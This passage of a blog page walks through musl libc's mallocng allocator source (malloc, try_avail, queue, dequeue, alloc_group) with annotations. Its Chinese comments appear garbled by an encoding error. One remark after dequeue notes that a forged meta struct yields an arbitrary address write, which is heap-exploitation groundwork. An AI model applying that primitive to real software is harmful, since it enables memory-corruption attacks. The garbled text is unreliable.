class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span>;</span></span><br><span class="line"><span class="type">uint32_t</span> mask, first;</span><br><span class="line">    <span class="comment">// sizeclass</span></span><br><span class="line"><span class="type">int</span> sc;</span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line"><span class="type">int</span> ctr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mmap åˆ†é…</span></span><br><span class="line">    <span class="comment">// #define MMAP_THRESHOLD 131052</span></span><br><span class="line"><span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;</span><br><span class="line"><span class="type">size_t</span> needed = n + IB + UNIT;</span><br><span class="line"><span class="type">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE,</span><br><span class="line">MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">wrlock();</span><br><span class="line">step_seq();</span><br><span class="line">g = alloc_meta();</span><br><span class="line"><span class="keyword">if</span> (!g) &#123;</span><br><span class="line">unlock();</span><br><span class="line">munmap(p, needed);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">g-&gt;mem = p;</span><br><span class="line">g-&gt;mem-&gt;meta = g;</span><br><span class="line">g-&gt;last_idx = <span class="number">0</span>;</span><br><span class="line">g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">g-&gt;sizeclass = <span class="number">63</span>;</span><br><span class="line">g-&gt;maplen = (needed+<span class="number">4095</span>)/<span class="number">4096</span>;</span><br><span class="line">g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// use a global counter to cycle offset in</span></span><br><span class="line"><span class="comment">// individually-mmapped allocations.</span></span><br><span class="line">ctx.mmap_counter++;</span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ ¹æ® n å– size_classes å¯¹åº”å¤§å°çš„ä¸‹æ ‡</span></span><br><span class="line">sc = size_to_class(n);</span><br><span class="line"></span><br><span class="line">rdlock();</span><br><span class="line">    </span><br><span class="line"><span class="comment">/* å¯»æ‰¾åˆé€‚çš„ meta */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è·å–å¯¹åº”å¤§å°çš„ meta</span></span><br><span class="line">g = ctx.active[sc];</span><br><span class="line"></span><br><span class="line"><span class="comment">// use coarse size classes initially when there are not yet</span></span><br><span class="line"><span class="comment">// any groups of desired size. this allows counts of 2 or 3</span></span><br><span class="line"><span class="comment">// to be allocated at first rather than having to start with</span></span><br><span class="line"><span class="comment">// 7 or 5, the min counts for even size classes.</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¦‚æœæ²¡æœ‰å¯¹åº”çš„ metaï¼Œä¸” 4 &lt;= sc &lt; 32 ä¸” sc !=6 ä¸” sc ä¸ºå¶æ•° ä¸”å¯¹åº”å¤§å°çš„æ‰€æœ‰ chunk æ•°é‡ä¸º 0</span></span><br><span class="line"><span class="keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="number">4</span> &amp;&amp; sc&lt;<span class="number">32</span> &amp;&amp; sc!=<span class="number">6</span> &amp;&amp; !(sc&amp;<span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨æ›´å¤§ä¸€ç‚¹ï¼ˆsc+1ï¼‰çš„ meta</span></span><br><span class="line"><span class="type">size_t</span> usage = ctx.usage_by_class[sc|<span class="number">1</span>];</span><br><span class="line"><span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line"><span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// å¦‚æœ sc+1 å¯¹åº”çš„ meta ä¹Ÿä¸å­˜åœ¨æˆ–å­˜åœ¨ä½†æ²¡æœ‰å¯ç”¨çš„ chunk åˆ™ usage+3</span></span><br><span class="line"><span class="keyword">if</span> (!ctx.active[sc|<span class="number">1</span>] || (!ctx.active[sc|<span class="number">1</span>]-&gt;avail_mask</span><br><span class="line">    &amp;&amp; !ctx.active[sc|<span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">usage += <span class="number">3</span>;</span><br><span class="line">        <span class="comment">// å¦‚æœ usage &lt;= 12 åˆ™ sc+1</span></span><br><span class="line"><span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">sc |= <span class="number">1</span>;</span><br><span class="line">g = ctx.active[sc];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* end */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* å¯»æ‰¾å¯åˆ†é…çš„ chunk */</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line"><span class="comment">// å–æœ€ä½ä½çš„ 1ï¼Œå³å–å¯ç”¨çš„ idx æœ€å°çš„ chunkï¼Œæ²¡æœ‰åˆ™ä¸º 0</span></span><br><span class="line">first = mask&amp;-mask;</span><br><span class="line">        <span class="comment">// è‹¥æ— å¯ç”¨ chunkï¼Œåˆ™è·³å‡ºå¾ªç¯</span></span><br><span class="line"><span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// è‹¥æ²¡æœ‰å…¶ä»–é—®é¢˜ï¼Œåˆ™åœ¨ avail_mask ä¸­å°†å¯¹åº” chunk çš„é‚£ä¸€ bit ä½ç½®é›¶</span></span><br><span class="line"><span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">g-&gt;avail_mask = mask-first;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è®¡ç®—å‡ºå¯¹åº”çš„ chunk idx</span></span><br><span class="line">idx = a_ctz_32(first);</span><br><span class="line"><span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br><span class="line">upgradelock();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœæ²¡æœ‰åˆé€‚çš„ chunkï¼Œåˆ™è¿›ä¸€æ­¥åˆ†é…ï¼Œè·å– chunk ä¸‹æ ‡</span></span><br><span class="line">idx = alloc_slot(sc, n);</span><br><span class="line"><span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">unlock();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// æ›´æ–°ä¸ºå³å°†ä½¿ç”¨çš„ meta</span></span><br><span class="line">g = ctx.active[sc];</span><br><span class="line"><span class="comment">/* end */</span></span><br><span class="line">    </span><br><span class="line">success:</span><br><span class="line">ctr = ctx.mmap_counter;</span><br><span class="line">unlock();</span><br><span class="line"><span class="keyword">return</span> enframe(g, idx, n, ctr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>å°† size è½¬åŒ–ä¸ºå¯¹åº”çš„ size_classes çš„ä¸‹æ ‡ sc</li><li>å– ctx.active[sc] ç¬¬ä¸€ä¸ª metaï¼Œå–å…¶ avail_mask ä¸­ idx æœ€å°çš„ chunk</li><li>å¦‚æœæ²¡æœ‰åˆ™è¿›å…¥ <code>alloc_slot</code> åšè¿›ä¸€æ­¥åˆ†é…</li></ol><h3 id="alloc-slot"><a href="#alloc-slot" class="headerlink" title="alloc_slot"></a>alloc_slot</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/malloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_slot</span><span class="params">(<span class="type">int</span> sc, <span class="type">size_t</span> req)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);</span><br><span class="line"><span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœé“¾è¡¨ä¸­éƒ½æ²¡æœ‰å¯ç”¨çš„ chunkï¼Œåˆ™é‡æ–°ç”³è¯·ä¸€ä¸ª group</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req);</span><br><span class="line"><span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">g-&gt;avail_mask--;</span><br><span class="line"><span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>è¿›å…¥ <code>try_avail</code> å°è¯•ä» ctx.active[sc] å¯¹åº”çš„ meta é“¾è¡¨ä¸­å¯»æ‰¾å¯åˆ†é…çš„ chunk</li><li>æ²¡æœ‰åˆ™è¿›å…¥ <code>alloc_group</code> å†ç”³è¯·ä¸€ä¸ª meta å’Œ group</li></ol><h3 id="try-avail"><a href="#try-avail" class="headerlink" title="try_avail"></a>try_avail</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/malloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">try_avail</span><span class="params">(<span class="keyword">struct</span> meta **pm)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *pm;</span><br><span class="line"><span class="type">uint32_t</span> first;</span><br><span class="line"><span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">uint32_t</span> mask = m-&gt;avail_mask;</span><br><span class="line">    <span class="comment">// è‹¥æ²¡æœ‰å¯åˆ†é…çš„ chunk</span></span><br><span class="line"><span class="keyword">if</span> (!mask) &#123;</span><br><span class="line"><span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!m-&gt;freed_mask) &#123;</span><br><span class="line">            <span class="comment">/* ä¸”ä¹Ÿæ²¡æœ‰ freed chunkï¼Œå³ group ä¸­çš„ chunk éƒ½æ˜¯ inuse</span></span><br><span class="line"><span class="comment">               åˆ™å°†è¯¥ meta ä» ctx.active[sc] å’Œ åŒå‘é“¾è¡¨ä¸­ç§»é™¤ */</span></span><br><span class="line">dequeue(pm, m);</span><br><span class="line">m = *pm;</span><br><span class="line"><span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// ä¼˜å…ˆä½¿ç”¨ä¸‹ä¸€ä¸ª meta çš„ freed_chunk</span></span><br><span class="line">m = m-&gt;next;</span><br><span class="line">*pm = m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mask = m-&gt;freed_mask;</span><br><span class="line"></span><br><span class="line"><span class="comment">// skip fully-free group unless it&#x27;s the only one</span></span><br><span class="line"><span class="comment">// or it&#x27;s a permanently non-freeable group</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è·³è¿‡æ‰€æœ‰ chunk éƒ½æ˜¯ freed_chunk ä¸”å¯ free çš„ metaï¼Œä¸€èˆ¬ä¸ä¼šå‡ºç°è¿™ä¸ªæƒ…å†µ</span></span><br><span class="line"><span class="keyword">if</span> (mask == (<span class="number">2u</span>&lt;&lt;m-&gt;last_idx)<span class="number">-1</span> &amp;&amp; m-&gt;freeable) &#123;</span><br><span class="line">m = m-&gt;next;</span><br><span class="line">*pm = m;</span><br><span class="line">mask = m-&gt;freed_mask;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// activate more slots in a not-fully-active group</span></span><br><span class="line"><span class="comment">// if needed, but only as a last resort. prefer using</span></span><br><span class="line"><span class="comment">// any other group with free slots. this avoids</span></span><br><span class="line"><span class="comment">// touching &amp; dirtying as-yet-unused pages.</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">/* æ€»ç»“èµ·æ¥å°±æ˜¯ï¼Œå¦‚æœç¬¬ä¸€ä¸ª meta çš„ chunk éƒ½æ˜¯ inuseï¼Œ</span></span><br><span class="line"><span class="comment">   ä¸”ç¬¬äºŒä¸ª meta çš„ freed_chunk ä½¿ç”¨å®Œäº†ï¼Œæ‰è¿›å…¥ä¸‹é¢çš„æ“ä½œ</span></span><br><span class="line"><span class="comment">   å¯èƒ½æ˜¯ä»€ä¹ˆç‰¹æ®Šæƒ…å†µï¼Œæ­£å¸¸ä¸ä¼šå‡ºç°è¿™ä¸ªæƒ…å†µ*/</span></span><br><span class="line"><span class="keyword">if</span> (!(mask &amp; ((<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>))) &#123;</span><br><span class="line"><span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">m = m-&gt;next;</span><br><span class="line">*pm = m;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> size = size_classes[m-&gt;sizeclass]*UNIT;</span><br><span class="line"><span class="type">int</span> span = UNIT + size*cnt;</span><br><span class="line"><span class="comment">// activate up to next 4k boundary</span></span><br><span class="line"><span class="keyword">while</span> ((span^(span+size<span class="number">-1</span>)) &lt; <span class="number">4096</span>) &#123;</span><br><span class="line">cnt++;</span><br><span class="line">span += size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (cnt &gt; m-&gt;last_idx+<span class="number">1</span>)</span><br><span class="line">cnt = m-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">m-&gt;mem-&gt;active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line"><span class="comment">// å°† freed_mask è½¬ä¸º avail_mask</span></span><br><span class="line">mask = activate_group(m);</span><br><span class="line">assert(mask);</span><br><span class="line">decay_bounces(m-&gt;sizeclass);</span><br><span class="line">&#125;</span><br><span class="line">first = mask&amp;-mask;</span><br><span class="line">m-&gt;avail_mask = mask-first;</span><br><span class="line"><span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>è‹¥ active ç¬¬ä¸€ä¸ª meta çš„ chunk éƒ½æ˜¯ inuseï¼Œåˆ™å°†æ­¤ meta ä» active å’Œ é“¾è¡¨ä¸­ç§»å‡º</li><li>å°† active ç¬¬ä¸€ä¸ª meta è®¾ç½®ä¸ºä¸‹ä¸€ä¸ª meta</li><li>å°†å…¶ freed_mask è½¬ä¸º avail_mask ä½¿ç”¨</li><li>å– avail_mask ä¸­ idx æœ€å°çš„ chunk</li></ol><h3 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">queue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line">assert(!m-&gt;next);</span><br><span class="line">assert(!m-&gt;prev);</span><br><span class="line"><span class="keyword">if</span> (*phead) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">head</span> =</span> *phead;</span><br><span class="line">m-&gt;next = head;</span><br><span class="line">m-&gt;prev = head-&gt;prev;</span><br><span class="line">m-&gt;next-&gt;prev = m-&gt;prev-&gt;next = m;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">m-&gt;prev = m-&gt;next = m;</span><br><span class="line">*phead = m;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="dequeue"><a href="#dequeue" class="headerlink" title="dequeue"></a>dequeue</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">dequeue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line"><span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">*phead = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœèƒ½å¤Ÿä¼ªé€  metaï¼Œå¯ä»¥ä»»æ„åœ°å€å†™</p><h3 id="alloc-group"><a href="#alloc-group" class="headerlink" title="alloc_group"></a>alloc_group</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/malloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> meta *<span class="title function_">alloc_group</span><span class="params">(<span class="type">int</span> sc, <span class="type">size_t</span> req)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> size = UNIT*size_classes[sc];</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, cnt;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *p;</span><br><span class="line">    <span class="comment">// ä¼˜å…ˆå¯»æ‰¾ freed_metaï¼Œå°†å…¶ä» ctx.free_meta_head ç§»é™¤</span></span><br><span class="line">    <span class="comment">// è‹¥æ²¡æœ‰å°±ä» meta_area ä¸­æŒ‰åœ°å€ä»ä½åˆ°é«˜é¡ºåºå–ä¸€ä¸ª</span></span><br><span class="line">    <span class="comment">// å¦‚æœ meta_area æ»¡äº†ï¼Œåˆ™å†ç”³è¯·ä¸€ä¸ª meta_area</span></span><br><span class="line">    <span class="comment">// ä¼šå°† meta çš„ prevï¼Œnext ç½®é›¶</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> alloc_meta();</span><br><span class="line"><span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> usage = ctx.usage_by_class[sc];</span><br><span class="line"><span class="type">size_t</span> pagesize = PGSZ;</span><br><span class="line"><span class="type">int</span> active_idx;</span><br><span class="line">    </span><br><span class="line"><span class="comment">/* è®¾ç½® cntï¼Œä¹Ÿå°±æ˜¯ group èƒ½å®¹çº³ chunk æœ€å¤§æ•°é‡ */</span></span><br><span class="line"><span class="keyword">if</span> (sc &lt; <span class="number">9</span>) &#123;</span><br><span class="line"><span class="keyword">while</span> (i&lt;<span class="number">2</span> &amp;&amp; <span class="number">4</span>*small_cnt_tab[sc][i] &gt; usage)</span><br><span class="line">i++;</span><br><span class="line">cnt = small_cnt_tab[sc][i];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// lookup max number of slots fitting in power-of-two size</span></span><br><span class="line"><span class="comment">// from a table, along with number of factors of two we</span></span><br><span class="line"><span class="comment">// can divide out without a remainder or reaching 1.</span></span><br><span class="line">cnt = med_cnt_tab[sc&amp;<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// reduce cnt to avoid excessive eagar allocation.</span></span><br><span class="line"><span class="keyword">while</span> (!(cnt&amp;<span class="number">1</span>) &amp;&amp; <span class="number">4</span>*cnt &gt; usage)</span><br><span class="line">cnt &gt;&gt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// data structures don&#x27;t support groups whose slot offsets</span></span><br><span class="line"><span class="comment">// in units don&#x27;t fit in 16 bits.</span></span><br><span class="line"><span class="keyword">while</span> (size*cnt &gt;= <span class="number">65536</span>*UNIT)</span><br><span class="line">cnt &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* end */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// If we selected a count of 1 above but it&#x27;s not sufficient to use</span></span><br><span class="line"><span class="comment">// mmap, increase to 2. Then it might be; if not it will nest.</span></span><br><span class="line"><span class="keyword">if</span> (cnt==<span class="number">1</span> &amp;&amp; size*cnt+UNIT &lt;= pagesize/<span class="number">2</span>) cnt = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// All choices of size*cnt are &quot;just below&quot; a power of two, so anything</span></span><br><span class="line"><span class="comment">// larger than half the page size should be allocated as whole pages.</span></span><br><span class="line"><span class="keyword">if</span> (size*cnt+UNIT &gt; pagesize/<span class="number">2</span>) &#123;</span><br><span class="line"><span class="comment">// check/update bounce counter to start/increase retention</span></span><br><span class="line"><span class="comment">// of freed maps, and inhibit use of low-count, odd-size</span></span><br><span class="line"><span class="comment">// small mappings and single-slot groups if activated.</span></span><br><span class="line"><span class="type">int</span> nosmall = is_bouncing(sc);</span><br><span class="line">account_bounce(sc);</span><br><span class="line">step_seq();</span><br><span class="line"></span><br><span class="line"><span class="comment">// since the following count reduction opportunities have</span></span><br><span class="line"><span class="comment">// an absolute memory usage cost, don&#x27;t overdo them. count</span></span><br><span class="line"><span class="comment">// coarse usage as part of usage.</span></span><br><span class="line"><span class="keyword">if</span> (!(sc&amp;<span class="number">1</span>) &amp;&amp; sc&lt;<span class="number">32</span>) usage += ctx.usage_by_class[sc+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// try to drop to a lower count if the one found above</span></span><br><span class="line"><span class="comment">// increases usage by more than 25%. these reduced counts</span></span><br><span class="line"><span class="comment">// roughly fill an integral number of pages, just not a</span></span><br><span class="line"><span class="comment">// power of two, limiting amount of unusable space.</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">4</span>*cnt &gt; usage &amp;&amp; !nosmall) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">1</span> &amp;&amp; size*cnt&gt;<span class="number">8</span>*pagesize) cnt = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">2</span> &amp;&amp; size*cnt&gt;<span class="number">4</span>*pagesize) cnt = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">0</span> &amp;&amp; size*cnt&gt;<span class="number">8</span>*pagesize) cnt = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">0</span> 